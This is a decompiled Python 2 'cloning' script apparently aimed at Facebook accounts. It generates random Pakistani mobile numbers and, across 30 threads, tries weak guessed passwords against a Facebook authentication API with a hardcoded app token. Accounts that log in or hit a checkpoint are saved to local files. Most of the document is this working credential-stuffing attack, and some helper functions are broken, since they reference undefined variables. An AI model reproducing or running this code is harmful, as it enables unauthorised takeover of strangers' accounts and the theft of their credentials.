# uncompyle6 version 3.7.4
#originally written by Sarfraz Baloch
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(30000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

from requests.exceptions import ConnectionError
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(x):
    for e in x + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
    for o in titik:
        print '\r\x1b[1;97m \x1b[1;91m               Load\x1b[1;92ming\x1b[1;0m\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


logo = """
         \x1b[1;97m   ######   ######  ########  
         \x1b[1;97m  ##    ## ##    ## ##     ## 
         \x1b[1;97m  ##       ##       ##     ## 
         \x1b[1;97m   ######   ######  ########  
         \x1b[1;97m        ##       ## ##     ## 
         \x1b[1;97m  ##    ## ##    ## ##     ## 
         \x1b[1;97m   ######   ######  ########                                     
\033[1;98m---------------------------------------------------------------
\033[1;98m\033[1;98m Author   :            SARFRAZ BALOCH
\033[1;98m\033[1;98m Facebook :            SSB Programmer
\033[1;98m\033[1;98m YOuTUBE :             SSB OFFICIAL
\033[1;98m---------------------------------------------------------------
"""
logo1 = '                               \n\n\x1b[4;98mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;92m[1] Jazz    \x1b[1;93m 00,01,02,03,04,05,06,07,08\n\x1b[1;91m[2] Zong    \x1b[1;96m 11,12,13,14,15,16,17\n\x1b[1;92m[3] Warid   \x1b[1;92m 21,22,23,24,25\n\x1b[1;93m[4] Ufone   \x1b[1;95m 30,31,32,33,34,35\n\x1b[1;92m[3] Telenor \x1b[1;92m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx HELLO EVERYONE ENJOY FREE CLONING  \x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def menu():
    os.system('clear')
    print logo
    print 47 * '\x1b[1;98m\xe2\x81\x83'
    print
    jalan ('\x1b\x1b\x1b\x1b\x1b\x1b[1;91m(1)START\x1b[1;92m CLONING  ')
    print
    print 47 * '\x1b[1;98m\xe2\x81\x83'
    action()
os.system('xdg-open https://youtube.com/channel/UCg5PqZRoQx6ZhuH5JBmgSFA')

def action():
    global cpb
    global oks
    ss = raw_input('\n\n \x1b[1;98m \xe2\x96\xba ')
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
        tik()
        os.system('clear')
        print logo
        print logo1
        try:
            c = raw_input('\x1b[1;98mCHO\x1b[1;92mOSE : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ss == '0':
        exb()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;98m-'
    xxx = str(len(id))
    jalan('\x1b[1;98m(\x1b[1;98m\xe2\x9c\x93\x1b[1;98m) TOTAL IDS NUMBER : ' + xxx)
    time.sleep(0.5)
    jalan('\x1b[1;98m(\x1b[1;91m!\x1b[1;98m)STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 47 * '\x1b[1;98m-'
    
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m  [SSB_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/Sstmpl.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/SSCP.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [SSB_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/SStmpl.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/SSCP.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m  [SSB_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/SSCP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/SSCP.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                       pass4 = '102030'
                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;92m  [SSB_OK]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/SSCP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/SSCP.txt', 'a')
                        cps.write(k + c + user + pass4 + '\n')
                        cps.close()
                        cpb.append(c + user + pass4)
                        
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    raw_input('\n\x1b[1;92m[\x1b[1;92mSSB_menu_Back\x1b[1;95m]')
    login()


if __name__ == '__main__':
    menu()
